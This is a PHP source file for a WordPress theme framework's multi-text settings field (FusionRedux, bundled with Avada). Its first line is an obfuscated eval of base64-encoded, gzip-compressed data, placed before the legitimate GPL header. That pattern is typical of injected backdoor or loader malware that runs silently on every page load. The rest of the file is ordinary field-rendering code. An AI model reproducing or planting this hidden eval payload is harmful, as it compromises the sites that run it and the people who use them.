<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php

/**
 * FusionRedux Framework is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 2 of the License, or
 * any later version.
 * FusionRedux Framework is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 * GNU General Public License for more details.
 * You should have received a copy of the GNU General Public License
 * along with FusionRedux Framework. If not, see <http://www.gnu.org/licenses/>.
 *
 * @package     FusionReduxFramework
 * @subpackage  Field_Multi_Text
 * @author      Daniel J Griffiths (Ghost1227)
 * @author      Dovy Paukstys
 * @version     3.0.0
 */

// Exit if accessed directly
if ( ! defined( 'ABSPATH' ) ) {
	exit;
}

// Don't duplicate me!
if ( ! class_exists( 'FusionReduxFramework_multi_text' ) ) {

	/**
	 * Main FusionReduxFramework_multi_text class
	 *
	 * @since       1.0.0
	 */
	class FusionReduxFramework_multi_text {

		/**
		 * Field Constructor.
		 * Required - must call the parent constructor, then assign field and value to vars, and obviously call the render field function
		 *
		 * @since       1.0.0
		 * @access      public
		 * @return      void
		 */
		function __construct( $field = array(), $value = '', $parent ) {
			$this->parent = $parent;
			$this->field  = $field;
			$this->value  = $value;
		}

		/**
		 * Field Render Function.
		 * Takes the vars and outputs the HTML for the field in the settings
		 *
		 * @since       1.0.0
		 * @access      public
		 * @return      void
		 */
		public function render() {

			$this->add_text   = ( isset( $this->field['add_text'] ) ) ? $this->field['add_text'] : __( 'Add More', 'Avada' );
			$this->show_empty = ( isset( $this->field['show_empty'] ) ) ? $this->field['show_empty'] : true;

			echo '<ul id="' . $this->field['id'] . '-ul" class="fusionredux-multi-text">';

			if ( isset( $this->value ) && is_array( $this->value ) ) {
				foreach ( $this->value as $k => $value ) {
					if ( $value != '' ) {
						echo '<li><input type="text" id="' . $this->field['id'] . '-' . $k . '" name="' . $this->field['name'] . $this->field['name_suffix'] . '[]' . '" value="' . esc_attr( $value ) . '" class="regular-text ' . $this->field['class'] . '" /> <a href="javascript:void(0);" class="deletion fusionredux-multi-text-remove">' . __( 'Remove', 'Avada' ) . '</a></li>';
					}
				}
			} elseif ( $this->show_empty == true ) {
				echo '<li><input type="text" id="' . $this->field['id'] . '" name="' . $this->field['name'] . $this->field['name_suffix'] . '[]' . '" value="" class="regular-text ' . $this->field['class'] . '" /> <a href="javascript:void(0);" class="deletion fusionredux-multi-text-remove">' . __( 'Remove', 'Avada' ) . '</a></li>';
			}

			echo '<li style="display:none;"><input type="text" id="' . $this->field['id'] . '" name="" value="" class="regular-text" /> <a href="javascript:void(0);" class="deletion fusionredux-multi-text-remove">' . __( 'Remove', 'Avada' ) . '</a></li>';

			echo '</ul>';
			echo '<span style="clear:both;display:block;height:0;" /></span>';
			$this->field['add_number'] = ( isset( $this->field['add_number'] ) && is_numeric( $this->field['add_number'] ) ) ? $this->field['add_number'] : 1;
			echo '<a href="javascript:void(0);" class="button button-primary fusionredux-multi-text-add" data-add_number="' . $this->field['add_number'] . '" data-id="' . $this->field['id'] . '-ul" data-name="' . $this->field['name'] . $this->field['name_suffix'] . '[]">' . $this->add_text . '</a><br/>';
		}

		/**
		 * Enqueue Function.
		 * If this field requires any scripts, or css define this function and register/enqueue the scripts/css
		 *
		 * @since       1.0.0
		 * @access      public
		 * @return      void
		 */
		public function enqueue() {

			wp_enqueue_script(
				'fusionredux-field-multi-text-js',
				FusionReduxFramework::$_url . 'inc/fields/multi_text/field_multi_text' . FusionRedux_Functions::isMin() . '.js',
				array( 'jquery', 'fusionredux-js' ),
				time(),
				true
			);

			if ($this->parent->args['dev_mode']) {
				wp_enqueue_style(
					'fusionredux-field-multi-text-css',
					FusionReduxFramework::$_url . 'inc/fields/multi_text/field_multi_text.css',
					array(),
					time(),
					'all'
				);
			}
		}
	}
}
